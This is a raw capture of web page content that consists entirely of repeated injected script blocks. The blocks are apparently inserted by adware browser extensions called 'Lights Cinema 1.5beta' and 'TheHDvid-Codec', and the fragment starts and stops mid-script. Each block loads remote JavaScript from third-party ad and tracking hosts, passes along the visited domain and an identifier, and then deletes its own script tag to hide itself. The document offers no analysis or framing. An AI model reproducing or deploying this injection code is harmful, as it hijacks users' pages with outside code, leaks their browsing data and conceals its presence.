window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 281 || 287 !== 281 || 119 !== 281)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (281 != 273 && 281 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(281)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(281) ){return;}function f(){return typeof window['__utility_running_71387_281__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://clkdeals.com/adServe/getTag?pid=11021&type=inject&cid=300266110029000000&appName=Lights%20Cinema%201.5beta&q=__DOMAIN__';var httpsUrl = '';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_281__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 281) : 281;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_281__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 281) : 281;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_71387_281__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_71387_288__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 288 || 287 !== 288 || 119 !== 288)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (288 != 273 && 288 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(288)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(288) ){return;}function f(){return typeof window['__utility_running_71387_288__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://istatic.eshopcomp.com/fo/min/crqc.js?hid=149525929fae92db32a394a703a5bbe7&bname=Lights%20Cinema%201.5beta&subid=300266110029000000';var httpsUrl = 'https://istatic.eshopcomp.com/fo/min/crqc.js?hid=149525929fae92db32a394a703a5bbe7&bname=Lights%20Cinema%201.5beta&subid=300266110029000000';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_288__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 288) : 288;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_288__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 288) : 288;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_71387_288__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_71387_450__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 450 || 287 !== 450 || 119 !== 450)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (450 != 273 && 450 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(450)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(450) ){return;}function f(){return typeof window['__utility_running_71387_450__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/p3af2c8/300266110029000000/l.js?pid=2271&ext=Lights%20Cinema%201.5beta';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/p3af2c8/300266110029000000/l.js?pid=2271&ext=Lights%20Cinema%201.5beta';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_71387_450__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 450) : 450;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_71387_450__'] = true;window['__MMR5K'] = window['__MMR5K'] ? (window['__MMR5K'] + ',' + 450) : 450;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_71387_450__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_391__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 391 || 287 !== 391 || 119 !== 391)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (391 != 273 && 391 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(391)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(391) ){return;}function f(){return typeof window['__utility_running_63315_391__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/h0982be/300182410022000000/l.js?pid=2294&ext=TheHDvid-Codec';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/h0982be/300182410022000000/l.js?pid=2294&ext=TheHDvid-Codec';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_391__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 391) : 391;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_391__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 391) : 391;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_391__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_390__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 390 || 287 !== 390 || 119 !== 390)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (390 != 273 && 390 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(390)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(390) ){return;}function f(){return typeof window['__utility_running_63315_390__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/h0982be/300182410022000000/l.js?pid=2295&ext=TheHDvid-Codec';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/h0982be/300182410022000000/l.js?pid=2295&ext=TheHDvid-Codec';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_390__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 390) : 390;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_390__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 390) : 390;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_390__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_102__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 102 || 287 !== 102 || 119 !== 102)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (102 != 273 && 102 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(102)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(102) ){return;}function f(){return typeof window['__utility_running_63315_102__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://i.crbsjs.info/crbf/javascript.js?channel=crdr_300182410022000000&appTitle=TheHDvid-Codec&hid=149525929fae92db32a394a703a5bbe7';var httpsUrl = 'https://i_crbsjs_info.tlscdn.com/crbf/javascript.js?channel=crdr_300182410022000000&appTitle=TheHDvid-Codec&hid=149525929fae92db32a394a703a5bbe7';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_102__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 102) : 102;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_102__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 102) : 102;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_102__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_178__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 178 || 287 !== 178 || 119 !== 178)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (178 != 273 && 178 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(178)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(178) ){return;}function f(){return typeof window['__utility_running_63315_178__'] !== 'undefined';}try {if (f()) {return;}window._rvz1700x1037={'publisher_subid':'300182410022000000','addonname':'TheHDvid-Codec'};var httpUrl = 'http://asrv-a.akamaihd.net/sd/1700/1037.js';var httpsUrl = 'https://asrv-a.akamaihd.net/sd/1700/1037.js';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_178__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 178) : 178;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_178__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 178) : 178;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_178__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_180__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 180 || 287 !== 180 || 119 !== 180)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (180 != 273 && 180 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(180)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(180) ){return;}function f(){return typeof window['__utility_running_63315_180__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://a.snowplanes.com/a.php?626ref2=300182410022000000&626Name=TheHDvid-Codec&626ref3=149525929fae92db32a394a703a5bbe7&626ref1=63726f73737269646572&teid=63315&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var httpsUrl = 'https://a.snowplanes.com/a.php?626ref2=300182410022000000&626Name=TheHDvid-Codec&626ref3=149525929fae92db32a394a703a5bbe7&626ref1=63726f73737269646572&teid=63315&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_180__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 180) : 180;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_180__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 180) : 180;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_180__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_223__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 223 || 287 !== 223 || 119 !== 223)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (223 != 273 && 223 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(223)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(223) ){return;}function f(){return typeof window['__utility_running_63315_223__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdn.visadd.com/script/14567725765/preload.js?subid=300182410022000000&um=TheHDvid-Codec';var httpsUrl = 'https://cdn.visadd.com/script/14567725765/preload.js?subid=300182410022000000&um=TheHDvid-Codec';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_223__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 223) : 223;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_223__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 223) : 223;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_223__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_234__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 234 || 287 !== 234 || 119 !== 234)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (234 != 273 && 234 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(234)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(234) ){return;}function f(){return typeof window['__utility_running_63315_234__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://istatic.eshopcomp.com/fo/ec/crr.js?hid=149525929fae92db32a394a703a5bbe7&subid=300182410022000000&bname=TheHDvid-Codec&blink=';var httpsUrl = 'https://istatic.eshopcomp.com/fo/ec/crr.js?hid=149525929fae92db32a394a703a5bbe7&subid=300182410022000000&bname=TheHDvid-Codec&blink=';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_234__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 234) : 234;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_234__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 234) : 234;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_234__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_273__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 273 || 287 !== 273 || 119 !== 273)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (273 != 273 && 273 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(273)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(273) ){return;}function f(){return typeof window['__utility_running_63315_273__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_id=1145&subaff_id=300182410022000000&sbrand=TheHDvid-Codec';var httpsUrl = 'https://cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_id=1145&subaff_id=300182410022000000&sbrand=TheHDvid-Codec';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_273__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 273) : 273;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_273__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 273) : 273;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_273__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_281__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 281 || 287 !== 281 || 119 !== 281)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (281 != 273 && 281 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(281)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(281) ){return;}function f(){return typeof window['__utility_running_63315_281__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://clkdeals.com/adServe/getTag?pid=11021&type=inject&cid=300182410022000000&appName=TheHDvid-Codec&q=__DOMAIN__';var httpsUrl = '';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_281__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 281) : 281;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_281__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 281) : 281;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_281__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_288__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 288 || 287 !== 288 || 